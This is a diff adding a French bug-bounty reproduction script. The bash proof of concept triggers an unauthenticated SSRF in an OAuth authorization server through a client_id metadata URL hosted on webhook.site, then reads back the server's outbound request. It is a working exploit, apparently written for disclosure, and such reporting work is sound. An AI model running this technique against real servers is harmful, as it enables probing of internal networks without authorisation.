@@ -1,0 +1,53 @@
+PIECE JOINTE 2 - SCRIPT DE REPRODUCTION (a executable sous bash : chmod +x, puis ./fichier <UUID> [chemin-unique])
+======================================================================================================================
+#!/usr/bin/env bash
+# PoC : SSRF non authentifie sur le serveur d'autorisation OAuth de BugSecure
+# (chemin CIMD : client_id = URL)
+#
+# Usage :  ./P2-poc.sh <UUID-webhook> [chemin-unique]
+#
+# LeChercheur doit disposer d'un service qui journalise les requetes recues.
+# Ce script publie le document de metadonnées client, declenche l'appel non
+# authentifie, puis affiche ce que l'AS a repondu.
+set -euo pipefail
+UUID="${1:?UUID du service de reception}"
+PATH_="${2:-cimd-$(date +%s)}"
+BASE="https://webhook.site/${UUID}"
+AS="https://bugsecure-api.senintel.sn"
+CID="${BASE}/${PATH_}"
+
+echo "== 1/3  publication du document de metadonnées client =="
+echo "    URL du client_id : ${CID}"
+# Le service de reception doit servir ce JSON sur cette URL exacte.
+cat <<JSON
+{
+  "client_id": "${CID}",
+  "client_name": "bb-cimd-research (document de test)",
+  "redirect_uris": ["${BASE}/cb"],
+  "grant_types": ["authorization_code", "refresh_token"],
+  "response_types": ["code"],
+  "token_endpoint_auth_method": "none",
+  "scope": "programs:read profile:read reports:read reports:write"
+}
+JSON
+echo
+echo "    (publier ce JSON sur ${CID} avant de lancer l'etape 2)"
+
+echo
+echo "== 2/3  appel NON AUTHENTIFIE qui declenche le fetch =="
+curl -sS -D- -o/dev/null "${AS}/oauth/authorize?response_type=code\
+&client_id=$(printf '%s' "$CID" | sed -e 's|:|%3A|g' -e 's|/|%2F|g' -e 's|https|%68%74%74%70%73|g')\
+&redirect_uri=$(printf '%s' "${BASE}/cb" | sed -e 's|:|%3A|g' -e 's|/|%2F|g')\
+&scope=programs%3Aread%20profile%3Aread\
+&state=bb-test&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\
+&code_challenge_method=S256\
+&resource=https%3A%2F%2Fbugsecure-api.senintel.sn" | sed -n '1,12p'
+
+echo
+echo "== 3/3  ce que le service de reception a recu =="
+curl -sS "https://webhook.site/token/${UUID}/requests?sorting=newest" | head -c 1200
+echo
+echo
+echo "Attendu : une requete GET sur le chemin ${PATH_}"
+echo "  User-Agent: BugSecure-OAuth/1 (+client-id-metadata-document)"
+echo "  ip: <IP de sortie de l'infrastructure BugSecure>  (et non celle du chercheur)"
